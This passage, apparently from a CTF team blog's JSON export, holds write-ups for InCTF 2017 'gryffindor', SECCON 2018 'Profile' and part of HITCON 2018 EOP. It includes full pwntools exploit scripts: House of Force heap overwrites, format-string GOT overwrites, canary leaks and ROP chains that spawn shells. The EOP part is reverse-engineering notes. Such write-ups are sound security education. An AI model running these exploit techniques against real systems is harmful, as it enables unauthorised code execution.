doing this in two ways: Overwriting exit GOT address with one_gadget by using format string. Overwriting atoi GOT address (now printf) with system from libc, and send /bin/sh as string. I will explain the first one since it’s a little more difficult and the 2nd is just a repetition of what we did before with the only difference of atoi is now printf, which can complicate a little bit the things: Format String123456789101112131415161718192021222324252627282930ONE_GADGET = LIBC_BASE + 0x4526aONE_GADGET_LOW = ONE_GADGET &amp; 0xffffffffONE_GADGET_HIGH = (ONE_GADGET &amp; 0xffffffff00000000) &gt;&gt; 32r.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_HIGH)+ 'A'*12+p64(binary.got['exit']+4))r.recv()ONE_GADGET_LOW0 = ONE_GADGET_LOW &gt;&gt; 16ONE_GADGET_LOW1 = ONE_GADGET_LOW &amp; 0xffffr.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_LOW0)+ 'A'*12+p64(binary.got['exit']+2))r.recvuntil('&gt;&gt;')r.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_LOW1)+ 'A'*12+p64(binary.got['exit']))r.recvuntil('&gt;&gt;')r.send('%7$llnCC'+ p64(STACK_ADDRESS)) # sets the one_gadget constraint to nullr.recvuntil('&gt;&gt;')time.sleep(0.3)r.sendline('111') # sends option 4 to exit the program # atoi is now printf, the return value # of printf is the number of characters # printed so if we want option 4 we need # to send 4 chars, in this case 3 \"1s\" and # \"\\n\" new line characterr.interactive() I separated the one_gadget from libc address in 3 parts so it’s easier to perform the format string, I won’t explain how I did it in detail, if you want to learn how to do a format string in detail you can check my other write up here, to get the offset for the one_gadget you can use this tool: 12345678910111213141516$ one_gadget libc.so.6 0x45216 execve(\"/bin/sh\", rsp+0x30, environ)constraints: rax == NULL0x4526a execve(\"/bin/sh\", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf0274 execve(\"/bin/sh\", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1117 execve(\"/bin/sh\", rsp+0x70, environ)constraints: [rsp+0x70] == NULL I used the offset 0x4526a it has a constraint in rsp+0x30, we can use once again format string to set this constraints to null, since we leaked a stack address before we can calculate the offset from the leaked adress with the same trick we used to calculate the offset to libc_base by using gdb. The full exploit using format string 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *import sysdef add_g(size, index): r.recv() r.sendline('1') r.recv() r.sendline(size) r.recv() r.sendline(index)def edit_g(size, index, inp, choice='3'): r.recv() r.sendline(choice) r.recv() r.sendline(index) r.recv() r.sendline(size) r.sendline(inp)context.terminal = ['tmux', 'new-window']binary = ELF('./gryffindor')libc = ELF('libc.so.6')r = process('./gryffindor', env=&#123;'LD_LIBRARY_PATH': os.path.join(os.getcwd(),\"./libc.so.6\")+\" \"+sys.path[0]&#125;)#gdb.attach(r, \"\"\"# b *0x400bd9# \"\"\")r.recv()r.sendline('1337')top_chunk = int(r.recv(9),16)+0x1b0log.info('[X] LEAKED HEAP 0x%x' % (top_chunk))################################################################################ HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerabilityadd_g('130', '0')edit_g(str(18*8), '0','A'*17*8 + p64(-1,signed=True))add_g(str(binary.got['atoll']-top_chunk), '1')add_g('130', '2')edit_g('130', '2', p64(binary.plt['atoll']+6) + p64(binary.plt['malloc']+6) + p64(binary.plt['setvbuf']+6) + p64(binary.plt['printf']+6))##################################################### LEAK LIBCr.recv()time.sleep(0.1)r.sendline('%p %p %p')s = r.recv()list_addr = s.split(' ')STACK_ADDRESS = int(list_addr[0],16)+168-32-32leaked = int(list_addr[2][:-8].rstrip(),16)LIBC_BASE = leaked-0xf7260SYSTEM = LIBC_BASE + libc.symbols['system']ONE_GADGET = LIBC_BASE + 0x4526aONE_GADGET_LOW = ONE_GADGET &amp; 0xffffffffONE_GADGET_HIGH = (ONE_GADGET &amp; 0xffffffff00000000) &gt;&gt; 32log.info('[X] LEAKED 0x%x' % (leaked))log.info('[X] LEAKED LIBC_BASE 0x%x' % LIBC_BASE)log.info('[X] LEAKED STACK_ADDRESS 0x%x' % STACK_ADDRESS)log.info('[X] LEAKED SYSTEM 0x%x' % SYSTEM)log.info('[X] LEAKED LOW_ONE_GADGET 0x%x' % ONE_GADGET_LOW)log.info('[X] LEAKED HIGH_ONE_GADGET 0x%x' % ONE_GADGET_HIGH)##################################################### Replace exit got with one_gadget using format stringr.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_HIGH)+ 'A'*12+p64(binary.got['exit']+4))r.recv()ONE_GADGET_LOW0 = ONE_GADGET_LOW &gt;&gt; 16ONE_GADGET_LOW1 = ONE_GADGET_LOW &amp; 0xffffr.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_LOW0)+ 'A'*12+p64(binary.got['exit']+2))r.recvuntil('&gt;&gt;')r.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_LOW1)+ 'A'*12+p64(binary.got['exit']))r.recvuntil('&gt;&gt;')r.send('%7$llnCC'+ p64(STACK_ADDRESS)) # sets the one_gadget constraint to nullr.recvuntil('&gt;&gt;')time.sleep(0.3)r.sendline('111') # sends option 4 to exit the program#####################################################r.interactive() The exploit using house of force a 2nd time to spawn a shell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *import sysdef add_g(size, index): r.recv() r.sendline('1') r.recv() r.sendline(size) r.recv() r.sendline(index)def edit_g(size, index, inp, choice='3'): if choice == '3': r.recv() r.sendline(choice) else: r.send(choice) r.recv() r.sendline(index) r.recv() if choice == '3': r.sendline(size) r.sendline(inp) else: r.send(size) r.sendline(inp)#print sys.path[0]#exit(0)context.terminal = ['tmux', 'new-window']binary = ELF('./gryffindor')libc = ELF('libc.so.6')r = process('./gryffindor', env=&#123;'LD_LIBRARY_PATH': os.path.join(os.getcwd(),\"./libc.so.6\")+\" \"+sys.path[0]&#125;)#gdb.attach(r, \"\"\"# b *0x400af0# \"\"\")# b *0x400bd9# b *0x400BCD# \"\"\")# b *0x400BB5# b *0x400989# b *0x400bd9# b *0x400BD9# \"\"\")r.recv()r.sendline('1337')heap = int(r.recv(9),16)+0x1b0log.info('[X] LEAKED HEAP 0x%x' % (heap))################################################################################ HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerabilityadd_g('130', '0')edit_g(str(18*8), '0','A'*17*8 + p64(-1,signed=True))add_g(str(binary.got['atoll']-heap), '1')add_g('130', '2')edit_g('130', '2', p64(binary.plt['atoll']+6) + p64(binary.plt['malloc']+6) + p64(binary.plt['setvbuf']+6) + p64(binary.plt['printf']+6))#edit_g('130', '2', p64(binary.plt['read']+6))##################################################### LEAK LIBCr.recv()time.sleep(0.1)r.sendline('%p %p %p')s = r.recv()list_addr = s.split(' ')STACK_ADDRESS = int(list_addr[0],16)+168leaked = int(list_addr[2][:-8].rstrip(),16)LIBC_BASE = leaked-0xf7260SYSTEM = LIBC_BASE + libc.symbols['system']ONE_GADGET = LIBC_BASE + 0xf1117ONE_GADGET_LOW = ONE_GADGET &amp; 0xffffffffONE_GADGET_HIGH = (ONE_GADGET &amp; 0xffffffff00000000) &gt;&gt; 32log.info('[X] LEAKED 0x%x' % (leaked))log.info('[X] LEAKED LIBC_BASE 0x%x' % LIBC_BASE)log.info('[X] LEAKED STACK_ADDRESS 0x%x' % STACK_ADDRESS)log.info('[X] LEAKED SYSTEM 0x%x' % SYSTEM)log.info('[X] LEAKED LOW_ONE_GADGET 0x%x' % ONE_GADGET_LOW)log.info('[X] LEAKED HIGH_ONE_GADGET 0x%x' % ONE_GADGET_HIGH)#exit(0)##################################################### Replace exit got with one_gadget using format stringrop = p64(binary.plt['atoll']+6) + \\ p64(binary.plt['malloc']+6) + \\ p64(binary.plt['setvbuf']+6) + \\ p64(SYSTEM)edit_g('A'*31+'\\x00', '22\\x00', rop, choice='111\\x00')r.recvuntil('&gt;&gt;')r.send('/bin/sh\\x00')#r.recvuntil('&gt;&gt;')r.interactive() References https://theswissbay.ch/pdf/_to_sort/heap-exploitation.pdf https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"Format String","slug":"Pwn/x64/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"},{"name":"House of Force","slug":"Pwn/x64/Glibc-Malloc/House-of-Force","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Force/"},{"name":"Heap Overflow","slug":"Pwn/x64/Heap-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Heap-Overflow/"}],"tags":[{"name":"heap_overflow","slug":"heap-overflow","permalink":"https://teamrocketist.github.io/tags/heap-overflow/"},{"name":"format_string","slug":"format-string","permalink":"https://teamrocketist.github.io/tags/format-string/"},{"name":"inctf2017","slug":"inctf2017","permalink":"https://teamrocketist.github.io/tags/inctf2017/"}]},{"title":"[Pwn] Seccon 2018 - Profile","slug":"Pwn-Seccon-2018-Profile","date":"2018-11-04T16:46:32.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2018/11/04/Pwn-Seccon-2018-Profile/","link":"","permalink":"https://teamrocketist.github.io/2018/11/04/Pwn-Seccon-2018-Profile/","excerpt":"","text":"Profile25564 SolvesHost: profile.pwn.seccon.jpPort: 28553profile_e814c1a78e80ed250c17e94585224b3f3be9d383libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253 We have a 64 bit binary, we can start by checking it’s security with checksec: 1234567$ checksec profile_e814c1a78e80ed250c17e94585224b3f3be9d383 [*] '/ctf/work/ctf/seccon2018/pwn/profile/profile_e814c1a78e80ed250c17e94585224b3f3be9d383' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ELF protections and how to bypass them:NX (Non-executable stack) this can be circumvented using ROP (Return oriented programming). Partial RELRO makes almost no difference, other than it forces the GOT to come before the BSS in memory, eliminating the risk of a buffer overflows on a global variable overwriting GOT entries. Stack Canary random value positioned just before the saved ebp and the return address, if this value is somehow changed for example with a buffer overflow, the program throws an exception preventing an attack, one way to bypass this is by finding a way to leak addresses from the stack , the value we want is obviously the canary itself. Finding a way to leak addressesResuming a little bit what the program does, we can create a profile with the specific fields name, age and message, later on we are presented a menu where we can update our message, print our profile and exit. The profile creation part in the beginning doesn’t seem to have any kind of vulnerability, the strings are being created with std::string which is being defined using the std::basic_string class template, which has three template parameters, on ida a std::string shows up like this: 1std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v14, argv); Nothing seems wrong in here, we have a lot of string declarations with std::string, the input reading from the user cin class from c++ which is fine against overflows. The only thing left now is the methods of the class profile Profile::update_msg and Profile::show, so just by reading the names of this methods we can already deduce what is going to happen, update_msg is probably where we are going to find some kind of overflow (receives user input to update profile msg), and on show is probably where we are going to leak addresses from memory, because it involves printing fields from our class object profile. Profile::update_msgOnce again std::string is being used, one particular optimization of the std::string object is when receives small strings it creates small buffer, which saves dynamic allocations. Which means, when small strings are passed to the constructor (len &lt; 16) it string is stored in the stack instead of allocating on the heap, we can verify this easily if we create a c++ program and modify the new constructor to print some debugging : 123456789101112131415161718#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;string&gt;// replace operator new and delete to log allocationsvoid* operator new(std::size_t n) &#123; std::cout &lt;&lt; \"[Allocating \" &lt;&lt; n &lt;&lt; \" bytes]\"; return malloc(n);&#125;void operator delete(void* p) throw() &#123; free(p);&#125;int main() &#123; for (size_t i = 0; i &lt; 24; ++i) &#123; std::cout &lt;&lt; i &lt;&lt; \": \" &lt;&lt; std::string(i, '=') &lt;&lt; std::endl; &#125;&#125; The output 1234567891011121314151617181920212223240:1: =2: ==3: ===4: ====5: =====6: ======7: =======8: ========9: =========10: ==========11: ===========12: ============13: =============14: ==============15: ===============[Allocating 32 bytes]16: ================[Allocating 32 bytes]17: =================[Allocating 32 bytes]18: ==================[Allocating 32 bytes]19: ===================[Allocating 32 bytes]20: ====================[Allocating 32 bytes]21: =====================[Allocating 32 bytes]22: ======================[Allocating 32 bytes]23: ======================= Now looking at the code right after the declaration of std:string a function named MALLOC_USABLE_SIZE according to the man pages it says it obtains size of block of memory allocated from heap , but what happens if nothing we pass a pointer from the stack? the unexpected will happen this function will return -8 (0xfffffffffffffff8), this value won’t be interpreted as negative but as a very high number because the variables are declared as unsigned ints, this will later be passed to the stop loop condition of getn function, entering into a infinite loop and only stops when a new line (0xa) is found which will lead to a buffer overflow. UpdateMessage function getn function On GDB after MALLOC_USABLE_SIZE, the value is returned into rax Now if we do some testing to check what is in the stack after we use update message with 8‘A’ and 8‘B’: The values from the stack Some gdb commands that might help you finding the stack canary and ret addr Leaking the libc is easy, we just need to set a got address to leak it, but how do we leak the canary? We need to find a way to leak an address from the stack, having this we can calculate its offset to the canary address, but how do we do this? we can take advantage of the fact that we have a large part of the address of the pointer to profile.name, if we only modify the last byte of the pointer of profile.name and we just need to keep iterating from 0x00 to 0xff until we reach the address of the string that we inserted 0x4141414141414141, after that it is a matter of only adding another 0x10 and we can expose that address of the stack, getting this we just need to do the difference between this address and the canary. The leaked values will show up after “Name: “, because we are changing the value of the pointer to profile.name in the stack! with this if we print the profile, the profile.name will print the pointer we changed… Part of the code to calculate this offset:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *def getConn(): #d = os.environ #d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253' return process(filename, env=&#123;'LD_PRELOAD':'./libc-2.23'&#125;) if local else remote(host, port)def leakAddr(addr, bytes_to_read=6): r.recv() r.sendline('1') r.recv() r.sendline('A'*8 + 'B'*8 + addr) r.recv() r.sendline('2') r.recvuntil('Name : ') return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))context.terminal = ['tmux', 'new-window']filename = './profile_e814c1a78e80ed250c17e94585224b3f3be9d383'host = 'profile.pwn.seccon.jp'port = 28553local = Truebinary = ELF(filename)libc = ELF('libc-2.23')POPRET = 0x401713LEAKED_ADDR = 0x0i = 0r = getConn()gdb.attach(r, ''' b *0x4011e1 b *0x4013C9 b *0x40148D ''')r.recv()r.sendline('2'*15)r.recv()r.sendline('3')r.recv()r.sendline('4')log.info('----------Searching for the offset-------------') while LEAKED_ADDR != 0x414141414141 and i &lt; 0xff: LEAKED_ADDR = leakAddr(p8(i)) log.info(\"LEAKED ADDR 0x%x 0x%x\" % (LEAKED_ADDR,i)) i += 0x10if i &gt; 0xff: print 'Unluckly couldn\\'t find the string position' r.close() exit(0) LEAKED_ADDR = leakAddr(p8(i))log.info('------------------Offset Found-----------------')CANARY_ADDR = LEAKED_ADDR+0x28log.info(\"LEAKED ADDR 0x%x\" % LEAKED_ADDR)log.info(\"CANARY ADDR 0x%x\" % (CANARY_ADDR))CANARY = leakAddr(p64(CANARY_ADDR) ,bytes_to_read=8)log.info(\"Canary 0x%x\" % CANARY) Leaking libcNow that we have the stack canary we can easily leak libc, we don’t even need to calculate offsets we just need to use the global offset table, we can use the GOT entry of read, and then calculate the offsets with the help of pwntools since we are loading the libc file in the beginning: 123456789READ = leakAddr(p64(binary.got['read']))LIBCBASE = READ - libc.symbols['read']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + libc.search('/bin/sh\\x00').next()EXIT = LIBCBASE + libc.symbols['exit']log.info(\"READ 0x%x\" % READ)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"BINSH 0x%x\" % BINSH) Now that we have all the libc we just need to build our rop chain, we need to find a gadget that puts /bin/sh into rdi, we can do this with POP RDI ; RET which will get the value in the top of the stack into RDI, after this we can call system, for a more detailed description you can read this write up on about to write a ropchain (it’s a little different because on this link the binary is statically linked instead of dynamically). 1234567ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(BINSH) # BINSH ADDRESS ARG[1]ropchain += p64(SYSTEM) # SYSTEM function \"call\"ropchain += p64(EXIT) # EXIT Actually useless you don't really# need to exit, but I usually like to exit without an error And now that we have everything we can calculate the final offsets:The rest of the code: 1234567r.sendline('1')r.recv()r.sendline(p64(0) * 7 + p64(CANARY) + p64(0)*3 + ropchain)r.recv()r.sendline('0')r.recv()r.interactive() The full code exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *def getConn(): #d = os.environ #d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253' return process(filename, env=&#123;'LD_PRELOAD':'./libc-2.23'&#125;) if local else remote(host, port)def leakAddr(addr, bytes_to_read=6): r.recv() r.sendline('1') r.recv() r.sendline('A'*8 + 'B'*8 + addr) r.recv() r.sendline('2') r.recvuntil('Name : ') return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))context.terminal = ['tmux', 'new-window']filename = './profile_e814c1a78e80ed250c17e94585224b3f3be9d383'host = 'profile.pwn.seccon.jp'port = 28553local = Falsebinary = ELF(filename)libc = ELF('libc-2.23')POPRET = 0x401713LEAKED_ADDR = 0x0i = 0r = getConn()#gdb.attach(r, '''# b *0x4011e1# b *0x4013C9# b *0x40148D# ''')r.recv()r.sendline('2'*15)r.recv()r.sendline('3')r.recv()r.sendline('4')log.info('----------Searching for the offset-------------') while LEAKED_ADDR != 0x414141414141 and i &lt; 0xff: LEAKED_ADDR = leakAddr(p8(i)) log.info(\"LEAKED ADDR 0x%x 0x%x\" % (LEAKED_ADDR,i)) i += 0x10if i &gt; 0xff: print 'Unluckly couldn\\'t find the string position' r.close() exit(0) LEAKED_ADDR = leakAddr(p8(i))log.info('------------------Offset Found-----------------')CANARY_ADDR = LEAKED_ADDR+0x28log.info(\"LEAKED ADDR 0x%x\" % LEAKED_ADDR)log.info(\"CANARY ADDR 0x%x\" % (CANARY_ADDR))CANARY = leakAddr(p64(CANARY_ADDR) ,bytes_to_read=8)log.info(\"Canary 0x%x\" % CANARY)READ = leakAddr(p64(binary.got['read']))LIBCBASE = READ - libc.symbols['read']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + libc.search('/bin/sh\\x00').next()EXIT = LIBCBASE + libc.symbols['exit']log.info(\"READ 0x%x\" % READ)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"BINSH 0x%x\" % BINSH)r.recv()ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(BINSH) # BINSH ADDRESS ARG[1]ropchain += p64(SYSTEM) # SYSTEM function \"call\"ropchain += p64(EXIT) # EXITr.sendline('1')r.recv()r.sendline(p64(0) * 7 + p64(CANARY) + p64(0)*3 + ropchain)r.recv()r.sendline('0')r.recv()r.interactive() Running it: 12345678910111213141516171819202122232425262728293031323334353637$ python profile.py [*] '/ctf/work/ctf/seccon2018/pwn/profile/profile_e814c1a78e80ed250c17e94585224b3f3be9d383' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '/ctf/work/ctf/seccon2018/pwn/profile/libc-2.23' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to profile.pwn.seccon.jp on port 28553: Done[*] ----------Searching for the offset-------------[*] LEAKED ADDR 0x323232320034 0x0[*] LEAKED ADDR 0x7ffc15b74720 0x10[*] LEAKED ADDR 0x323232323232 0x20[*] LEAKED ADDR 0x7ffc15b74740 0x30[*] LEAKED ADDR 0x600034 0x40[*] LEAKED ADDR 0x7ffc15b74760 0x50[*] LEAKED ADDR 0x414141414141 0x60[*] ------------------Offset Found-----------------[*] LEAKED ADDR 0x7ffc15b74770[*] CANARY ADDR 0x7ffc15b74798[*] Canary 0x16e9ecb89abcf100[*] READ 0x7f2e75ce7250[*] LIBC 0x7f2e75bf0000[*] SYSTEM 0x7f2e75c35390[*] BINSH 0x7f2e75d7cd57[*] Switching to interactive modeWrong input...$ lsflag.txtprofile$ cat flag.txtSECCON&#123;57r1ng_l0c4710n_15_n07_0nly_h34p&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"},{"name":"Canary Leak","slug":"Pwn/x64/Stack-Issue/Canary-Leak","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Canary-Leak/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"c++","slug":"c","permalink":"https://teamrocketist.github.io/tags/c/"},{"name":"malloc_usable_size","slug":"malloc-usable-size","permalink":"https://teamrocketist.github.io/tags/malloc-usable-size/"},{"name":"std::string","slug":"std-string","permalink":"https://teamrocketist.github.io/tags/std-string/"},{"name":"seccon2018","slug":"seccon2018","permalink":"https://teamrocketist.github.io/tags/seccon2018/"}]},{"title":"[Reverse] Hitcon 2018 - EOP","slug":"Reverse-Hitcon-2018-EOP","date":"2018-10-22T21:35:34.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2018/10/22/Reverse-Hitcon-2018-EOP/","link":"","permalink":"https://teamrocketist.github.io/2018/10/22/Reverse-Hitcon-2018-EOP/","excerpt":"","text":"EOPEOP.eop-811afa1b9fb0c0719a75afd316ea2c57Author: david942j29 Teams solved. Quite challenging reverse engineering, well at least it was for me, the binary wasn’t very hard to understand perhaps it had some strange exceptions “mechanics” which were being to used to jump to other parts of the code in a sequence order. Using IDA for this challenge was crucial for me at first I was just trying to use radare2 and gdb but I got quickly overwhelmed by the code, both static and dynamic analysis were made with IDA, IDA is good because you can easily navigate through control flow graphs while debugging and it’s very easy to change the views, one thing that really helped me was to create a view to keep track of some global variables that were being used for encryption in this challenge. You must be asking how I debugged an elf while using IDA on Windows, this can be done via remote debugging (the elf runs on an external linux machine) which is supported by IDA if you want to know how to do this. This binary is using multiple exceptions to manage the control flow of the program identifying this isn’t very hard after some trial and error I easily found where the exceptions were being thrown I just setted up alot of breakpoints while observing some global variables changes. The real deal in this challenge was to deal with the extensive encryption function I ended up very tired until I figured out the function. The ida pseudo c code converter wasn’t working at all so I needed to read pure assembly which isn’t a big problem for me but it definitively takes more time to read, luckily after fully understanding the encrypting function writing the code to reverse it was very easy. Identifying the size of the flag and extractBy opening the main function in IDA we can quickly see how much the size is the flag: Scrolling down a little bit we can quickly find where the binary is checking if the flag we inserted had the correct size, The encrypted flag is already stored in a global var, we can extract it using ida, you can do this by double clicking on the offset and then edit -&gt; export data (or shift + e while selecting it ) and you can select it to export to c like I did, you then can just adapt to other languages if you are using a different language like me (in my case python). Some Globals already showing up in the main function graph: Exporting it: Keep in mind that I renamed some functions and vars in ida so it might be a little different from yours (if youwant to check my idb ask it on the comments and I’ll upload it), Still looking at the main function, we can notice after the cmp [rbp+var_1C], 0x2f, the first 16 bytes of the string are extracted to two global variables flaginput and flaginput2 (renamed by me in IDA): As you notice from the image above after the split it’s going to call Alloc_throw_catch (renamed) this is where all the exception magic is going to happen: Keep in mind that begin_catch actually updates the value on the heap before we jump in CALL RAX so I assumed that begin does something besides limiting the limits of the catch. Putting a break on CALL RAX is smart because this is going to be executed multiple times and it’s from here we are going to jump into the encryption functions. Encryption FunctionsAfter jumping from CALL RAX we are going to jump into 1st encrytion function, the encryption process is separated in a lot of function, but they are very similar to each other some times they are even equal, the process is resumed in the box bellow: 1234567891011XorInputFlag|ReverveXoredString |Repeat 8 timesShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty different from the 1st AddAddXor)End Repeat|Xor|ExchangeByteOrders XorInputFlagIt simply xors the first 8 bytes (inputflag) with key which is stored in a global variable (does the same for the next 8 too “inputflag2”), for the first 16 bytes (Round 1) the key is zero and when you xor something with a zero it does absolutely nothing the value remains the same. The xor key is zero because the globals are set to zero, for the next rounds they are going to filled. On the image bellow I created a view (Views -&gt; Open subviews -&gt; Disassembly) so I can track all of this Globals so I know when they are going to be modified (helped me alot for debugging the entire process). This function aplies to both inputflag and inputflag2. ReverveXoredStringReceives a string of 8 bytes () This function reverses the 1st 4 bytes of the string (returned from XorInputFlag) and then uses xor with a key stored in a global which IDA names it off_5604E325B150 (the last numbers should differ because PIE is enabled), once again you can export it to later use it for reversing, this variable is a huge table with multiple values and is constantly used by the binary. The process is repeated again for the last 4 bytes but with a different offset from the xor key table. if you are confused with all the shift lefts in assembly don’t be the shifts are only used to change the order of the bytes of the input for example: 12345String -&gt; &apos;AA&apos;String in hex -&gt; 0x4141Shift left on &apos;AA&apos; -&gt; 0x414100and now a simple OR operation can be used to insert a character in the beginning of the string:0x414100 | 0x45 = 0x414145 -&gt; &apos;EAA&apos; The first 4 bytes of string returned from XorInputFlag: The last 4 bytes of string returned XorInputFlag: Resuming it the the result of the first bytes are saved on dword_560CC63C71C0 and the last ones are saved on dword_560CC63C71C4. ShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty diferent from the 1st AddAddXor)This process is going to be repeated 8 times! And they only difference on each interaction is the offsets to the xor key table is increases 0x10. ShrAddXorThis function does a bunch of operations to calculate the index of 4 xor keys from the global array, it then applies 3 sequential xors as explained bellow, the result is saved in a new variable dword_560CC63C71D0 . The Function Applied to the first 4 bytes (Value coming from dword_5604E325B1C0) The function applied to the last 4 bytes are coming from the global dword_5604E325B1C4 and is going to be stored on dword_560CC63C71D4 the is the same but the order of the bytes extracted are different in this case the is4th byte, 1st byte, 2nd byte, 3rd byte and the final result is in a new variable dword_560CC63C71D4 . The Function applied to the last 4 bytes (Value coming from dword_5604E325B1C4) AddAddXorThis one is really simple but they differ from interaction to interaction regarding to the offsets, and as I said above the process is going to be repeated 8 times and the offset increases 0x10 on each operation as explained in the image bellow for the first 4 bytes: RorThis one is even simpler i just uses ror operation: the 4 bytes are extracted from dword_5604E325B1C0 and then saved to dword_5604E325B1C0 again. RolThis one is simple too it just uses rol operation: the 4 bytes are extracted from dword_5604E325B1C4 and then saved to dword_5604E325B1C4 again. AddAddXorAlmost the same as the previous AddAddXor but this one has this tricky operation lea edx, [rax + rax] which is equivalent to:1edx = (rax + rax) &amp; 0xffffffff The mask (0xffffffff) must be applied because edx is a 32 bit register, this is a little thing you need to keep in mind while writing the reverse script. The index offset to each iteration will also change here (increasing 0x10 as I mention before). The results of this function are saved in dword_560CC63C71C4 The examples given above are related to the second chunk of 8 bytes.Now for the 1st chunk of 8 bytes will run this same functions with only some differences in the offsets and the values will be saved in different globals dword_560CC63C71C8, dword_560CC63C71CC, dword_560CC63C71D8 and dword_560CC63C71DC. Xor &amp; ExchangeByteOrdersXor just xors the bytes by a key coming from the xor offset table the offsets are always the same (0x10,0x14,0x18,0x1c) for the 3 rounds after the xors and the result is stored in a new global dword_560CC63C71B0, ExchangeByteOrders will once again exchange bytes do some summations and the result is stored in a new global dword_560CC63C71B8. Bellow is the code equivalent to the assembly that comes after, since I’m running out of time I’ll post the python code now and then later I’ll post the assembly. 123456789101112131415161718192021222324252627# Xordword_560CC63C71C8 = dword_560CC63C71C8 ^ access_offstream(off_560CC63C7150, 0x10)dword_560CC63C71CC = dword_560CC63C71CC ^ access_offstream(off_560CC63C7150, 0x14)dword_560CC63C71C0 = dword_560CC63C71C0 ^ access_offstream(off_560CC63C7150, 0x18)dword_560CC63C71C4 = dword_560CC63C71C4 ^ access_offstream(off_560CC63C7150, 0x1c)dword_560CC63C71B0 = []# ExchangeByteOrdersfor dword in [dword_560CC63C71C8, dword_560CC63C71CC]: dword_560CC63C71B0 = [dword &amp; 0xff] +dword_560CC63C71B0 eax = dword &gt;&gt; 8 dword_560CC63C71B0 = [eax &amp; 0xff] +dword_560CC63C71B0 eax = dword &gt;&gt; 0x10 dword_560CC63C71B0 = [eax &amp; 0xff] +dword_560CC63C71B0 eax = dword &gt;&gt; 0x18 dword_560CC63C71B0 = [eax &amp; 0xff] +dword_560CC63C71B0dword_560CC63C71B8 = []for dword in [dword_560CC63C71C0, dword_560CC63C71C4]: dword_560CC63C71B8 = [dword &amp; 0xff] +dword_560CC63C71B8 eax = dword &gt;&gt; 8 dword_560CC63C71B8 = [eax &amp; 0xff] +dword_560CC63C71B8 eax = dword &gt;&gt; 0x10 dword_560CC63C71B8 = [eax &amp; 0xff] +dword_560CC63C71B8 eax = dword &gt;&gt; 0x18 dword_560CC63C71B8 = [eax &amp; 0xff] +dword_560CC63C71B8 Joining dword_560CC63C71B0 and dword_560CC63C71B8In the end of every encryption we end up returning to the main function and the globals dword_560CC63C71B0 and dword_560CC63C71B8 are stored next to each other in the memory which will be used to compare to the other encrypted flag. This is just for the first chunk of 16 bytes this, there is more 2 rounds to do for the rest of the characters but luckily they just repeat the same before the only thing that changes is on the first encryption function which now since the globals no longer are 0 the XorInputFlag function will make the difference. Joinining 